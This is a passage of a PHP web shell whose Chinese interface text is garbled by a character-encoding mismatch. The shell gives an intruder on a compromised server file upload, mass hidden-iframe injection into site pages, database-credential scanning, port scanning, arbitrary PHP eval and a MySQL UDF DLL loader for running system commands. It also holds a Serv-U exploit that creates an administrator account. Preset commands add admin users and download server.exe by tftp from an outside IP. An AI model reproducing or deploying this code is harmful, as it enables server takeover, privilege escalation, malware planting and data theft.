	html_n('<tr><td>�����������ϴ������ļ���С: '.@get_cfg_var('upload_max_filesize').'<form method="POST" enctype="multipart/form-data">');
	html_input("text","uppath",root_dir,"<br>�ϴ���·��: ","51");
print<<<END
<SCRIPT language="JavaScript">
function addTank(){
var k=0;
  k=k+1;
  k=tank.rows.length;
  newRow=document.all.tank.insertRow(-1)
  <!--ɾ��ѡ��-->
  newcell=newRow.insertCell()
  newcell.innerHTML="<input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'>"
}

function delTank() {
  if(tank.rows.length==1) return;
  var checkit = false;
  for (var i=0;i<document.all.tankNo.length;i++) {
    if (document.all.tankNo[i].checked) {
      checkit=true;
      tank.deleteRow(i+1);
      i--;
    }
  }
  if (checkit) {
  } else{
    alert("��ѡ��һ��Ҫɾ���Ķ���");
    return false;
  }
}
</SCRIPT>
<br><br>
<table cellSpacing=0 cellPadding=0 width="100%" border=0>       
          <tr>
            <td width="7%"><input class="button01" type="button"  onclick="addTank()" value=" �� �� " name="button2"/>
            <input name="button3"  type="button" class="button01" onClick="delTank()" value="ɾ��" />
            </td>
          </tr>
</table>
<table  id="tank" width="100%" border="0" cellpadding="1" cellspacing="1" >
<tr><td>��ѡ��Ҫ�ϴ����ļ���</td></tr>
<tr><td><input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'></td></tr>
</table>
END;
	html_n('<br><input type="submit" name="upfiles" value="�ϴ�" style="width:80px;"> <input type="button" value="����" onclick="window.location=\'?eanver=main&path='.root_dir.'\';" style="width:80px;">');
	if($_POST['upfiles']){
		foreach ($_FILES["upfile"]["error"] as $key => $error){
			if ($error == UPLOAD_ERR_OK){
				$tmp_name = $_FILES["upfile"]["tmp_name"][$key];
				$name = $_FILES["upfile"]["name"][$key];
				$uploadfile = str_path($_POST['uppath'].'/'.$name);
				$upload = @copy($tmp_name,$uploadfile) ? $name.$msg[2] : @move_uploaded_file($tmp_name,$uploadfile) ? $name.$msg[2] : $name.$msg[3];
				echo '<br><br>'.$upload;
			}
		}
	}
	html_n('</form>');
	break;
	
	case "guama":
	$patht = isset($_POST['path']) ? $_POST['path'] : root_dir;
	$typet = isset($_POST['type']) ? $_POST['type'] : ".html|.shtml|.htm|.asp|.php|.jsp|.cgi|.aspx";
	$codet = isset($_POST['code']) ? $_POST['code'] : "<iframe src=\"http://localhost/eanver.htm\" width=\"1\" height=\"1\"></iframe>";
	html_n('<tr><td>�ļ���������"|"����,Ҳ������ָ���ļ���.<form method="POST"><br>');
	html_input("text","path",$patht,"·����Χ","45");
	html_input("checkbox","pass","","ʹ��Ŀ¼����","",true);
	html_input("text","type",$typet,"<br><br>�ļ�����","60");
	html_text("code","67","5",$codet);
	html_n('<br><br>');
	html_radio("��������","��������","guama","qingma");
	html_input("submit","passreturn","��ʼ");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>Ŀ���ļ�:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($patht,$codet,$_POST['return'],$bool,$typet);
	}
	break;
	
	case "tihuan":
	html_n('<tr><td>�˹��ܿ������滻�ļ�����,��С��ʹ��.<br><br><form method="POST">');
	html_input("text","path",root_dir,"·����Χ","45");
	html_input("checkbox","pass","","ʹ��Ŀ¼����","",true);
	html_text("newcode","67","5",$_POST['newcode']);
	html_n('<br><br>�滻Ϊ');
	html_text("oldcode","67","5",$_POST['oldcode']);
	html_input("submit","passreturn","�滻","<br><br>");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>Ŀ���ļ�:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['newcode'],"tihuan",$bool,$_POST['oldcode']);
	}
	break;
	
	case "scanfile":
	css_js("4");
	html_n('<tr><td>�˹��ܿɺܷ��������������MYSQL�û�����������ļ�,������Ȩ.<br>���������ļ�̫��ʱ,��Ӱ��ִ���ٶ�,������ʹ��Ŀ¼����.<form method="POST" name="sform"><br>');
	html_input("text","path",root_dir,"·����","45");
	html_input("checkbox","pass","","ʹ��Ŀ¼����","",true);
	html_input("text","code",$_POST['code'],"<br><br>�ؼ���","40");
	html_select(array("--MYSQL�����ļ�--","Discuz","PHPWind","phpcms","dedecms","PHPBB","wordpress","sa-blog","o-blog"),0,"onchange='return Fulll(options[selectedIndex].value)'");
	html_n('<br><br>');
	html_radio("�����ļ���","������������","scanfile","scancode");
	html_input("submit","passreturn","����");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>�ҵ��ļ�:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['code'],$_POST['return'],$bool);
	}
	break;
	
	case "scanphp":
	html_n('<tr><td>ԭ���Ǹ��������붨���,��鿴�����жϺ��ٽ���ɾ��.<form method="POST"><br>');
	html_input("text","path",root_dir,"���ҷ�Χ","40");
	html_input("checkbox","pass","","ʹ��Ŀ¼����<br><br>�ű�����","",true);
	html_select(array("php" => "PHP","asp" => "ASP","aspx" => "ASPX","jsp" => "JSP"));
	html_input("submit","passreturn","����","<br><br>");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>�ҵ��ļ�:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['class'],"scanphp",$bool);
	}
	break;
	
	case "port":
	$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';
	$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|23|25|80|110|135|139|445|1433|3306|3389|43958|5631';
print<<<END
<form method="POST">
<div class="actall">ɨ��IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
<div class="actall">�˿ں� <input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
<div class="actall"><input type="submit" value="ɨ��" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['ip'])) && (!empty($_POST['port'])))
	{
		echo '<div class="actall">';
		$ports = explode('|', $_POST['port']);
		for($i = 0;$i < count($ports);$i++)
		{
			$fp = @fsockopen($_POST['ip'],$ports[$i],$errno,$errstr,2);
			echo $fp ? '<font color="#FF0000">���Ŷ˿� ---> '.$ports[$i].'</font><br>' : '�رն˿� ---> '.$ports[$i].'<br>';
			ob_flush();
			flush();
		}
		echo '</div>';
	}
	break;
	

	case "getcode":
if (isset($_POST['url'])) {$proxycontents = @file_get_contents($_POST['url']);echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>��ȡ URL ����ʧ��</b></p></center></body>";exit;}
print<<<END
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form method="POST" target="proxyframe">
  <tr class="firstalt">
	<td align="center"><b>���ߴ���</b></td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><br><ul><li>�ñ����ܽ�ʵ�ּ򵥵� HTTP ����,������ʾʹ�����·����ͼƬ�����Ӽ�CSS��ʽ��.</li><li>�ñ����ܿ���ͨ�������������Ŀ��URL,����֧�� SQL Injection ̽���Լ�ĳЩ�����ַ�.</li><li>�ñ���������� URL,��Ŀ�����������µ�IP��¼�� : {$_SERVER['SERVER_NAME']}</li></ul></td>
  </tr>
  <tr class="firstalt">
	<td align="center" height=40  >URL: <input name="url" value="about:blank" type="text"  class="input" size="100" >
 <input name="" value="���" type="submit"  class="input" size="30" >
</td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="about:blank"></iframe></td>
  </tr>
</form></table>
END;
	break;
	
	case "servu":
	$SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';
print<<<END
<div class="actall"><a href="?eanver=servu">[ִ������]</a> <a href="?eanver=servu&o=adduser">[�����û�]</a></div>
<form method="POST">
	<div class="actall">ServU�˿� <input name="SUPort" type="text" value="43958" style="width:300px"></div>
	<div class="actall">ServU�û� <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
	<div class="actall">ServU���� <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
END;
if($_GET['o'] == 'adduser')
{
print<<<END
<div class="actall">�ʺ� <input name="user" type="text" value="envl" style="width:200px">
���� <input name="password" type="text" value="envl" style="width:200px">
Ŀ¼ <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
END;
}
else
{
print<<<END
<div class="actall">��Ȩ���� <input name="SUCommand" type="text" value="net user envl envl /add & net localgroup administrators envl /add" style="width:600px"><br>
<input name="user" type="hidden" value="envl">
<input name="password" type="hidden" value="envl">
<input name="part" type="hidden" value="C:\\\\"></div>
END;
}
echo '<div class="actall"><input type="submit" value="ִ��" style="width:80px;"></div></form>';
	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
	{
		echo '<div class="actall">';
		$sendbuf = "";
		$recvbuf = "";
		$domain  = "-SETDOMAIN\r\n"."-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n"."-TZOEnable=0\r\n"." TZOKey=\r\n";
		$adduser = "-SETUSERSETUP\r\n"."-IP=0.0.0.0\r\n"."-PortNo=21\r\n"."-User=".$_POST['user']."\r\n"."-Password=".$_POST['password']."\r\n"."-HomeDir=c:\\\r\n"."-LoginMesFile=\r\n"."-Disable=0\r\n"."-RelPaths=1\r\n"."-NeedSecure=0\r\n"."-HideHidden=0\r\n"."-AlwaysAllowLogin=0\r\n"."-ChangePassword=0\r\n".
							 "-QuotaEnable=0\r\n"."-MaxUsersLoginPerIP=-1\r\n"."-SpeedLimitUp=0\r\n"."-SpeedLimitDown=0\r\n"."-MaxNrUsers=-1\r\n"."-IdleTimeOut=600\r\n"."-SessionTimeOut=-1\r\n"."-Expire=0\r\n"."-RatioUp=1\r\n"."-RatioDown=1\r\n"."-RatiosCredit=0\r\n"."-QuotaCurrent=0\r\n"."-QuotaMaximum=0\r\n".
							 "-Maintenance=None\r\n"."-PasswordType=Regular\r\n"."-Ratios=None\r\n"." Access=".$_POST['part']."\|RWAMELCDP\r\n";
		$deldomain = "-DELETEDOMAIN\r\n"."-IP=0.0.0.0\r\n"." PortNo=21\r\n";
		$sock = @fsockopen("127.0.0.1", $_POST["SUPort"],$errno,$errstr, 10);
		$recvbuf = @fgets($sock, 1024);
		echo "�������ݰ�: $recvbuf <br>";
		$sendbuf = "USER ".$_POST["SUUser"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "�������ݰ�: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "�������ݰ�: $recvbuf <br>";
		$sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "�������ݰ�: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "�������ݰ�: $recvbuf <br>";
		$sendbuf = "SITE MAINTENANCE\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "�������ݰ�: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "�������ݰ�: $recvbuf <br>";
		$sendbuf = $domain;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "�������ݰ�: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "�������ݰ�: $recvbuf <br>";
		$sendbuf = $adduser;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "�������ݰ�: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "�������ݰ�: $recvbuf <br>";
		if(!empty($_POST['SUCommand']))
		{
	 		$exp = @fsockopen("127.0.0.1", "21",$errno,$errstr, 10);
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "�������ݰ�: $recvbuf <br>";
	 		$sendbuf = "USER ".$_POST['user']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "�������ݰ�: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "�������ݰ�: $recvbuf <br>";
	 		$sendbuf = "PASS ".$_POST['password']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "�������ݰ�: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "�������ݰ�: $recvbuf <br>";
	 		$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "�������ݰ�: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "�������ݰ�: $recvbuf <br>";
	 		$sendbuf = $deldomain;
	 		@fputs($sock, $sendbuf, strlen($sendbuf));
	 		echo "�������ݰ�: $sendbuf <br>";
	 		$recvbuf = @fgets($sock, 1024);
	 		echo "�������ݰ�: $recvbuf <br>";
	 		@fclose($exp);
		}
		@fclose($sock);
		echo '</div>';
	}
	break;
	
	case "eval":
	$phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
	html_n('<tr><td><form method="POST">����д&lt;? ?&gt;��ǩ');
	html_text("phpcode","70","15",$phpcode);
	html_input("submit","eval","ִ��","<br><br>");
	if(!empty($_POST['eval'])){
	echo "<br><br>";
    eval(stripslashes($phpcode));
	}
	html_n('</form>');
	break;

	case "myexp":
	$MSG_BOX = '���ȵ���DLL,��ִ������.MYSQL�û�����ΪrootȨ��,����·�������ܼ���DLL�ļ�.';
	$info = '�������';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $mpath = 'C:/windows/mysqlDll.dll'; $sqlcmd = 'ver';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport']; $mpath = File_Str($_POST['mpath']); $sqlcmd = $_POST['sqlcmd'];
		$conn = mysql_connect($mhost.':'.$mport,$muser,$mpass);
		if($conn)
		{
			@mysql_select_db($mdata);
			if((!empty($_POST['outdll'])) && (!empty($_POST['mpath'])))
			{
				$query = "CREATE TABLE Envl_Temp_Tab (envl BLOB);";
				if(@mysql_query($query,$conn))
				{
					$shellcode = Mysql_shellcode();
					$query = "INSERT into Envl_Temp_Tab values (CONVERT(".$shellcode.",CHAR));";
					if(@mysql_query($query,$conn))
					{
						$query = 'SELECT envl FROM Envl_Temp_Tab INTO DUMPFILE \''.$mpath.'\';';
						if(@mysql_query($query,$conn))
						{
							$ap = explode('/', $mpath); $inpath = array_pop($ap);
							$query = 'Create Function state returns string soname \''.$inpath.'\';';
							$MSG_BOX = @mysql_query($query,$conn) ? '��װDLL�ɹ�' : '��װDLLʧ��';
						}
						else $MSG_BOX = '����DLL�ļ�ʧ��';
					}
					else $MSG_BOX = 'д����ʱ��ʧ��';
					@mysql_query('DROP TABLE Envl_Temp_Tab;',$conn);
				}
				else $MSG_BOX = '������ʱ��ʧ��';
			}
			if(!empty($_POST['runcmd']))
			{
				$query = 'select state("'.$sqlcmd.'");';
				$result = @mysql_query($query,$conn);
				if($result)
				{
					$k = 0; $info = NULL;
					while($row = @mysql_fetch_array($result)){$infotmp .= $row[$k];$k++;}
					$info = $infotmp;
					$MSG_BOX = 'ִ�гɹ�';
				}
				else $MSG_BOX = 'ִ��ʧ��';
			}
		}
		else $MSG_BOX = '����MYSQLʧ��';
	}
print<<<END
<script language="javascript">
function Fullm(i){
	Str = new Array(11);
	Str[0] = "ver";
	Str[1] = "net user envl envl /add";
	Str[2] = "net localgroup administrators envl /add";
	Str[3] = "net start Terminal Services";
	Str[4] = "tasklist /svc";
	Str[5] = "netstat -ano";
	Str[6] = "ipconfig";
	Str[7] = "net user guest /active:yes";
	Str[8] = "copy c:\\\\1.php d:\\\\2.php";
	Str[9] = "tftp -i 219.134.46.245 get server.exe c:\\\\server.exe";
	Str[10] = "net start telnet";
	Str[11] = "shutdown -r -t 0";
	mform.sqlcmd.value = Str[i];
	return true;
}
</script>
<form id="mform" method="POST">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<center><div class="actall">
��ַ <input type="text" name="mhost" value="{$mhost}" style="width:110px">
�˿� <input type="text" name="mport" value="{$mport}" style="width:110px">
�û� <input type="text" name="muser" value="{$muser}" style="width:110px">
���� <input type="text" name="mpass" value="{$mpass}" style="width:110px">
���� <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div><div class="actall">
�ɼ���·�� <input type="text" name="mpath" value="{$mpath}" style="width:555px"> 
<input type="submit" name="outdll" value="��װDLL" style="width:80px;"></div>
<div class="actall">��װ�ɹ������ <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
<select onchange="return Fullm(options[selectedIndex].value)">
<option value="0" selected>--�����--</option>
<option value="1">���ӹ���Ա</option>
<option value="2">��Ϊ������</option>
<option value="3">����Զ������</option>
<option value="4">�鿴���̺�PID</option>
<option value="5">�鿴�˿ں�PID</option>
<option value="6">�鿴IP</option>
<option value="7">����guest�ʻ�</option>
<option value="8">�����ļ�</option>
<option value="9">ftp����</option>
<option value="10">����telnet</option>
<option value="11">����</option>
</select>
<input type="submit" name="runcmd" value="ִ��" style="width:80px;">
<textarea style="width:720px;height:300px;">{$info}</textarea>
</div></center>
</form>
END;
	break;
	

	case "mysql_exec":
  if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))
  {
  	if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))
	  {
	  	$cookietime = time() + 24 * 3600;
	  	setcookie('m_eanverhost',$_POST['mhost'],$cookietime);
	  	setcookie('m_eanverport',$_POST['mport'],$cookietime);
	  	setcookie('m_eanveruser',$_POST['muser'],$cookietime);
	  	setcookie('m_eanverpass',$_POST['mpass'],$cookietime);
	  	die('���ڵ�½,���Ժ�...<meta http-equiv="refresh" content="0;URL=?eanver=mysql_msg">');
	  }
  }
print<<<END
<form method="POST" name="oform" id="oform">
<div class="actall">��ַ <input type="text" name="mhost" value="localhost" style="width:300px"></div>
<div class="actall">�˿� <input type="text" name="mport" value="3306" style="width:300px"></div>
<div class="actall">�û� <input type="text" name="muser" value="root" style="width:300px"></div>
<div class="actall">���� <input type="text" name="mpass" value="" style="width:300px"></div>
<div class="actall"><input type="submit" value="��½" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?eanver=mysql_msg';"></div>
</form>
END;
break;

case "mysql_msg":
	$conn = @mysql_connect($_COOKIE['m_eanverhost'].':'.$_COOKIE['m_eanverport'],$_COOKIE['m_eanveruser'],$_COOKIE['m_eanverpass']);
	if($conn)
	{
print<<<END
<script language="javascript">
function Delok(msg,gourl)
{
	smsg = "ȷ��Ҫɾ��[" + unescape(msg) + "]��?";
	if(confirm(smsg)){window.location = gourl;}
}
function Createok(ac)
{
	if(ac == 'a') document.getElementById('nsql').value = 'CREATE TABLE name (eanver BLOB);';
	if(ac == 'b') document.getElementById('nsql').value = 'CREATE DATABASE name;';
	if(ac == 'c') document.getElementById('nsql').value = 'DROP DATABASE name;';
	return false;
}
</script>
END;
		$BOOL = false;
		$MSG_BOX = '�û�:'.$_COOKIE['m_eanveruser'].' &nbsp;&nbsp;&nbsp;&nbsp; ��ַ:'.$_COOKIE['m_eanverhost'].':'.$_COOKIE['m_eanverport'].' &nbsp;&nbsp;&nbsp;&nbsp; �汾:';
		$k = 0;
		$result = @mysql_query('select version();',$conn);
		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		echo '<div class="actall"> ���ݿ�:';
		$result = mysql_query("SHOW DATABASES",$conn);
		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?eanver=mysql_msg&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
		echo '</div>';
		if(isset($_GET['db']))
		{
			mysql_select_db($_GET['db'],$conn);
			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? 'ִ�гɹ�' : 'ִ��ʧ�� '.mysql_error();}
			if(is_array($_POST['insql']))
			{
				$query = 'INSERT INTO '.$_GET['table'].' (';
				foreach($_POST['insql'] as $var => $key)
				{
					$querya .= $var.',';
					$queryb .= '\''.addslashes($key).'\',';
				}
				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
				$MSG_BOX = mysql_query($query,$conn) ? '���ӳɹ�' : '����ʧ�� '.mysql_error();
			}
			if(is_array($_POST['upsql']))
			{
				$query = 'UPDATE '.$_GET['table'].' SET ';
				foreach($_POST['upsql'] as $var => $key)
				{
					$queryb .= $var.'=\''.addslashes($key).'\',';
				}
				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
				$MSG_BOX = mysql_query($query,$conn) ? '�޸ĳɹ�' : '�޸�ʧ�� '.mysql_error();
			}
			if(isset($_GET['del']))
			{
				$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['del'].', 1;',$conn);
				$good = mysql_fetch_assoc($result);
				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
				$where = $query.substr($queryc, 0, -4).';';
				$MSG_BOX = mysql_query($where,$conn) ? 'ɾ���ɹ�' : 'ɾ��ʧ�� '.mysql_error();
			}
			$action = '?eanver=mysql_msg&db='.$_GET['db'];
			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? 'ɾ���ɹ�' : 'ɾ��ʧ�� '.mysql_error();}
			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
			echo '<div class="actall"><form method="POST" action="'.$action.'">';
			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
			echo '<input type="submit" name="querysql" value="ִ��" style="width:60px;height:49px;"> ';
			echo '<input type="button" value="������" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
			echo '<input type="button" value="������" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
			echo '<input type="button" value="ɾ����" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?eanver=mysql_msg&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
			if(isset($_GET['table']))
			{
				echo '<a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
				echo '[<a href="?eanver=mysql_msg&db='.$_GET['db'].'&insert='.$_GET['table'].'">����</a>]</div>';
				if(isset($_GET['edit']))
				{
					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
					echo '<form method="POST" action="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$atable.'">';
					$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['edit'].', 1;',$conn);
					$good = mysql_fetch_assoc($result);
					$u = 0;
					foreach($good as $var => $key)
					{
						$queryc .= $var.'=\''.$key.'\' AND ';
						$type = @mysql_field_type($result, $u);
						$len = @mysql_field_len($result, $u);
						echo '<div class="actall">'.$var.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="upsql['.$var.']" style="width:600px;height:60px;">'.htmlspecialchars($key).'</textarea></div>';
						$u++;
					}
					$where = 'WHERE '.substr($queryc, 0, -4);
					echo '<input type="hidden" id="wherevar" name="wherevar" value="'.base64_encode($where).'">';
					echo '<div class="actall"><input type="submit" value="Update" style="width:80px;"></div></form>';
				}
				else
				{
					$query = 'SHOW COLUMNS FROM '.$_GET['table'];
		      $result = mysql_query($query,$conn);
		      $fields = array();
			  $pagesize=20;
		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
			  $numrows=$row_num;
              $pages=intval($numrows/$pagesize);
              if ($numrows%$pagesize) $pages++;
              $offset=$pagesize*($page - 1);
              $page=$_GET['p'];
              if(!$page) $page=1;

		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
					echo '<table border="0"><tr>';
					echo '<td class="toptd" style="width:70px;" nowrap>����</td>';
					while($row = @mysql_fetch_assoc($result))
					{
						array_push($fields,$row['Field']);
						echo '<td class="toptd" nowrap>'.$row['Field'].'</td>';
					}
					echo '</tr>';
					if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $query = $_POST['nsql']; else $query = 'SELECT * FROM '.$_GET['table'].' LIMIT '.$p.', 20;';
					$result = mysql_query($query,$conn);
					$v = $p;
					while($text = @mysql_fetch_assoc($result))
					{
						echo '<tr><td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> �޸� </a> ';
						echo '<a href="#" onclick="Delok(\'��\',\'?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> ɾ�� </a></td>';
						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
						echo '</tr>'."\r\n";$v++;
					}
					echo '</table><div class="actall">';
                    $pagep=$page-1;
                    $pagen=$page+1;
                    echo "���� ".$row_num." ����¼ ";
                    if($pagep>0) $pagenav.="  <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=1&charset=".$_GET['charset']."'>��ҳ</a> <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pagep."&charset=".$_GET['charset']."'>��һҳ</a> "; else $pagenav.=" ��һҳ ";
                    if($pagen<=$pages) $pagenav.=" <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pagen."&charset=".$_GET['charset']."'>��һҳ</a> <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pages."&charset=".$_GET['charset']."'>βҳ</a>"; else $pagenav.=" ��һҳ ";
                    $pagenav.=" �� [".$page."/".$pages."] ҳ   ����<input name='textfield' type='text' style='text-align:center;' size='4' value='".$page."' onkeydown=\"if(event.keyCode==13)self.location.href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p='+this.value+'&charset=".$_GET['charset']."';\" />ҳ";
                    echo $pagenav;
					echo '</div>';
				}
			}
			elseif(isset($_GET['insert']))
			{
				echo '<a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['insert'].'">'.$_GET['insert'].'</a></div>';
				$result = mysql_query('SELECT * FROM '.$_GET['insert'],$conn);
				$fieldnum = @mysql_num_fields($result);
				echo '<form method="POST" action="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['insert'].'">';
				for($i = 0;$i < $fieldnum;$i++)
				{
					$name = @mysql_field_name($result, $i);
					$type = @mysql_field_type($result, $i);
					$len = @mysql_field_len($result, $i);
					echo '<div class="actall">'.$name.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="insql['.$name.']" style="width:600px;height:60px;"></textarea></div>';
				}
				echo '<div class="actall"><input type="submit" value="Insert" style="width:80px;"></div></form>';
			}
			else
			{
				$query = 'SHOW TABLE STATUS';
				$status = @mysql_query($query,$conn);
				while($statu = @mysql_fetch_array($status))
				{
					$statusize[] = $statu['Data_length'];
					$statucoll[] = $statu['Collation'];
				}
				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
				echo '</div><table border="0"><tr>';
				echo '<td class="toptd" style="width:550px;"> ���� </td>';
				echo '<td class="toptd" style="width:80px;"> ���� </td>';
				echo '<td class="toptd" style="width:130px;"> �ַ��� </td>';
				echo '<td class="toptd" style="width:70px;"> ��С </td></tr>';
				$result = @mysql_query($query,$conn);
				$k = 0;
				while($table = mysql_fetch_row($result))
				{
					$charset=substr($statucoll[$k],0,strpos($statucoll[$k],'_'));
					echo '<tr><td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
					echo '<td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&insert='.$table[0].'"> ���� </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?eanver=mysql_msg&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> ɾ�� </a></td>';
					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
					$k++;
				}
				echo '</table>';
			}
		}
	}
	else die('����MYSQLʧ��,�����µ�½.<meta http-equiv="refresh" content="0;URL=?eanver=mysql_exec">');
	if(!$BOOL and addslashes($query)!='') echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
break;

	
	default: html_main($path,$shellname); break;
}
css_foot();

/*---doing---*/

function do_write($file,$t,$text)
{
	$key = true;
	$handle = @fopen($file,$t);
	if(!@fwrite($handle,$text))
	{
		@chmod($file,0666);
		$key = @fwrite($handle,$text) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function do_show($filepath){
	$show = array();
	$dir = dir($filepath);
	while($file = $dir->read()){
		if($file == '.' or $file == '..') continue;
		$files = str_path($filepath.'/'.$file);
		$show[] = $files;
	}
	$dir->close();
	return $show;
}

function do_deltree($deldir){
	$showfile = do_show($deldir);
